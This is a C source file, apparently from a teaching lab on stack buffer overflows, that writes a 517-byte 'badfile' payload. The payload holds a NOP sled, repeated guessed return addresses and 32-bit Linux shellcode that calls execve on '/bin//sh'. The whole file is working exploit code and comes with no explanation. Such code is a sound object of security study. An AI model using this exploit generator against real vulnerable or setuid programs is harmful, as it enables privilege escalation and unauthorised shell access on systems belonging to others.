#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=  "\x31\xc0"            
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;              

unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_2", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
